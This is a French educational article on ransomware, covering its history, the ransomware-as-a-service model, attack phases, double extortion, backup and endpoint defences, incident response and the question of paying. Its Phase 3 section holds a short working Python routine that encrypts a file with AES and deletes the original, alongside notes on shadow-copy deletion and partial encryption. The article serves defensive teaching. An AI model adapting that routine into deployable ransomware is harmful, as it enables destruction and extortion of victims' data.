# Ransomware : anatomie d'une attaque moderne

Les ransomwares ont coûté **20 milliards de dollars** en 2023. Hospitals paralysés, entreprises arrêtées, données chiffrées — ces attaques sont devenues l'une des menaces les plus dévastatrices de la cybercriminalité. Comprendre leur fonctionnement interne est essentiel pour s'en défendre.

## L'évolution du ransomware

```
2013 : CryptoLocker
→ Premier ransomware moderne
→ Chiffrement RSA-2048 + AES
→ Paiement Bitcoin
→ 3 millions de dollars récoltés

2017 : WannaCry / NotPetya
→ Exploitation d'EternalBlue (NSA)
→ Auto-propagation (worm)
→ WannaCry : 4 milliards de dégâts
→ NotPetya : 10 milliards (destructeur, pas vraiment ransomware)

2019-aujourd'hui : Big Game Hunting
→ Ciblage des grandes entreprises
→ Double extorsion (chiffrement + vol de données)
→ Ransomware-as-a-Service (RaaS)
→ Négociations professionnelles
→ Rançons : 1M$ → 50M$+
```

## Ransomware-as-a-Service (RaaS)

```
Le modèle RaaS a industrialisé les ransomwares :

Opérateurs (développeurs) :
→ Développent et maintiennent le ransomware
→ Gèrent l'infrastructure de paiement
→ Fournissent le support aux affiliés (!!)
→ Prennent 20-30% des rançons

Affiliés (attaquants) :
→ Louent l'accès au ransomware
→ Conduisent les intrusions
→ Gardent 70-80% des rançons
→ Pas besoin de compétences de développement

Groupes RaaS célèbres :
→ LockBit (3.0) : le plus prolifique en 2023
→ ALPHV/BlackCat : Rust, multiplateforme
→ Cl0p : spécialiste des vulnérabilités zero-day
→ Royal : successeur de Conti
→ Black Basta : ex-membres de Conti
```

## Anatomie d'une attaque ransomware

### Phase 1 : Accès initial

```python
# Vecteurs d'entrée les plus courants en 2024

vecteurs = {
    "phishing": {
        "pourcentage": "41%",
        "technique": "Email avec pièce jointe malveillante ou lien",
        "exemple": "Fausse facture PDF avec macro Office malveillante"
    },
    "rdp_exposed": {
        "pourcentage": "20%",
        "technique": "RDP exposé sur Internet + brute force",
        "exemple": "Port 3389 accessible publiquement, mot de passe faible"
    },
    "vulnerability": {
        "pourcentage": "15%",
        "technique": "Exploitation de vulnérabilités non patchées",
        "exemple": "VPN Fortinet CVE-2023-27997, Exchange ProxyShell"
    },
    "supply_chain": {
        "pourcentage": "10%",
        "technique": "Compromission d'un fournisseur de confiance",
        "exemple": "MSP (Managed Service Provider) compromis → tous ses clients"
    },
    "credentials": {
        "pourcentage": "14%",
        "technique": "Credentials volés sur le dark web",
        "exemple": "Logs de stealers vendus sur Russian Market"
    }
}
```

### Phase 2 : Reconnaissance et mouvement latéral

```bash
# Sur le réseau de la victime, l'attaquant passe semaines/mois
# à explorer avant de déclencher le chiffrement

# Outils typiquement utilisés :
# Cobalt Strike, Brute Ratel, Sliver (C2)
# BloodHound (cartographie AD)
# Mimikatz (vol de credentials)
# AdFind, ADExplorer (énumération AD)

# Objectifs avant chiffrement :
1. Compromettre le Domain Controller (accès à TOUT)
2. Désactiver les sauvegardes (Veeam, Windows Backup, snapshots cloud)
3. Désactiver ou contourner l'EDR/antivirus
4. Exfiltrer les données (double extorsion)
5. Persister sur un maximum de machines

# Timeline typique :
# J0  : Accès initial (phishing ou RDP)
# J+7 : Compromission du premier admin
# J+14: Accès au Domain Controller
# J+21: Exfiltration silencieuse des données
# J+25: Destruction des sauvegardes
# J+28: DÉCLENCHEMENT du chiffrement
```

### Phase 3 : Chiffrement

```python
# Implémentation simplifiée d'un ransomware (ÉDUCATIF UNIQUEMENT)
# NE JAMAIS utiliser pour du vrai ransomware

import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import secrets

class RansomwareDemo:
    """Exemple ÉDUCATIF uniquement - Ne jamais déployer"""

    def __init__(self):
        # Générer une clé AES aléatoire pour chiffrer les fichiers
        self.aes_key = secrets.token_bytes(32)  # AES-256
        self.aes_iv = secrets.token_bytes(16)

        # La clé AES est chiffrée avec la clé publique RSA de l'attaquant
        # → Seul l'attaquant avec sa clé privée peut déchiffrer la clé AES
        # → Seul l'attaquant peut donc déchiffrer les fichiers

    def encrypt_file(self, filepath):
        """Chiffre un fichier avec AES-256-CBC"""
        with open(filepath, 'rb') as f:
            plaintext = f.read()

        # Padding pour AES
        from cryptography.hazmat.primitives import padding as sym_padding
        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(plaintext) + padder.finalize()

        # Chiffrement AES
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded) + encryptor.finalize()

        # Écrire le fichier chiffré
        with open(filepath + '.locked', 'wb') as f:
            f.write(self.aes_iv + ciphertext)

        os.remove(filepath)  # Supprimer l'original

# Les vrais ransomwares utilisent des techniques additionnelles :
# → Chiffrement partiel (premiers 1MB) pour aller plus vite
# → Ciblage des extensions (documents, images, BDD)
# → Shadow Copy deletion (suppression sauvegardes Windows)
# → Inhibition des outils de recovery
```

### Phase 4 : Double extorsion

```
Évolution de la stratégie de pression :

Simple extorsion (2013-2019) :
→ Chiffrement des fichiers
→ Payez ou perdez vos données
Problème pour la victime : si sauvegardes OK → pas de rançon

Double extorsion (2019+) :
→ Chiffrement + exfiltration des données
→ "Payez ou on publie vos données sur notre blog"
→ Données clients, RH, financières, secrets industriels
→ Efficace même si les sauvegardes fonctionnent

Triple extorsion (2021+) :
→ Double extorsion + contact direct des clients/partenaires
→ "Votre fournisseur a été hacké, vos données aussi"
→ DDoS simultané sur le site de la victime

Blogs de ransomware (leak sites) :
→ LockBit Blog, ALPHV Blog, Cl0p Blog
→ Publications des victimes qui refusent de payer
→ Accessible sur le Dark Web
```

## Défense contre les ransomwares

### La règle 3-2-1-1-0

```
3 copies des données
2 supports différents (disque local + NAS)
1 copie hors-site (cloud ou site distant)
1 copie air-gapped (déconnectée du réseau)
0 erreur de restauration vérifiée régulièrement

TESTER LES SAUVEGARDES RÉGULIÈREMENT !
Une sauvegarde non testée = sauvegarde inutile

Script de test de restauration hebdomadaire :
→ Restaurer un fichier aléatoire chaque semaine
→ Restaurer une VM complète chaque mois
→ Simuler une restauration complète chaque trimestre
```

### Architecture anti-ransomware

```yaml
# Mesures techniques prioritaires

Endpoints :
✅ EDR moderne (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint)
✅ Application Whitelisting (seulement les apps approuvées s'exécutent)
✅ Désactiver les macros Office (ou seulement macros signées)
✅ PowerShell Constrained Language Mode

Réseau :
✅ Segmentation : sauvegardes sur réseau isolé
✅ Pas de RDP exposé sur Internet (utiliser VPN + MFA)
✅ Monitoring DNS (détecter beaconing C2)
✅ Blocage des domaines malveillants connus

Active Directory :
✅ Tier Model (admins de domaine n'ont pas accès aux postes)
✅ LAPS (mots de passe admin locaux uniques)
✅ MFA pour tous les accès admin
✅ Alerte sur ajout aux groupes privilégiés

Sauvegardes :
✅ Immutable backups (ne peuvent pas être supprimées)
✅ Sauvegarde hors-ligne (air-gapped)
✅ Veeam avec Hardened Repository
✅ Snapshots cloud immuables (AWS S3 Object Lock)
```

### Réponse à une attaque active

```
DÉTECTION :
Alertes EDR sur chiffrement massif, Shadow Copy deletion, Cobalt Strike

CONFINEMENT IMMÉDIAT (< 15 minutes) :
1. Isoler les machines affectées du réseau (couper le câble ethernet)
2. Ne pas éteindre (préserver les preuves en RAM)
3. Activer le mode de crise (war room)
4. Contacter l'assurance cyber immédiatement

ÉVALUATION :
5. Identifier le périmètre atteint (combien de machines ?)
6. Les sauvegardes sont-elles intactes ?
7. Y a-t-il eu exfiltration de données ?
8. Quel groupe ransomware ? (identifier depuis la note de rançon)

DÉCISION : Payer ou ne pas payer ?
Facteurs :
→ Les sauvegardes fonctionnent ?     → Ne pas payer
→ Données critiques exfiltrées ?     → Considérer (avec juriste)
→ Vies humaines en jeu (hôpital) ?  → Cas particulier
→ Négociation possible ?             → Spécialistes IR (Coveware)
→ Groupe sanctionné (OFAC) ?        → Paiement ILLÉGAL

RESTAURATION :
→ Nettoyer 100% du réseau avant de restaurer
→ Patcher toutes les vulnérabilités exploitées
→ Réinitialiser TOUS les credentials
→ Restaurer depuis sauvegardes saines
→ Monitoring renforcé pendant 6 mois
```

## Le paiement de la rançon

```
Données statistiques :
→ 46% des victimes paient
→ Parmi ceux qui paient : 80% récupèrent leurs données
→ Parmi ceux qui paient : 46% sont re-attaqués dans l'année
→ Rançon moyenne 2023 : 1,54 million de dollars

Risques légaux du paiement :
→ USA (OFAC) : payer des groupes sanctionnés = crime fédéral
   (LockBit, Evil Corp, Cl0p sont sur la liste OFAC)
→ France : pas d'interdiction mais signalement ANSSI + Police obligatoire
→ Certaines assurances cyber remboursent les rançons

Alternatives au paiement :
→ No More Ransom (nomoreransom.org) :
   Outils de déchiffrement GRATUITS pour certains ransomwares
   Europol + Kaspersky + McAfee
→ Négociation professionnelle (Coveware, Kivu)
   Réduction de 50-80% de la rançon
```

## Conclusion

Les ransomwares sont devenus une industrie criminelle professionnelle avec ses équipes de développement, son support client et ses affiliés. La défense efficace repose sur **sauvegardes immuables hors-ligne + EDR + MFA partout + segmentation réseau**. Ces quatre mesures réduisent de 90% le risque d'être impacté. La question n'est pas "si" vous serez ciblé, mais "quand" — préparez votre plan de réponse avant l'incident.

---
*Article suivant : [Sécurité Kubernetes](../articles/securite-kubernetes)*
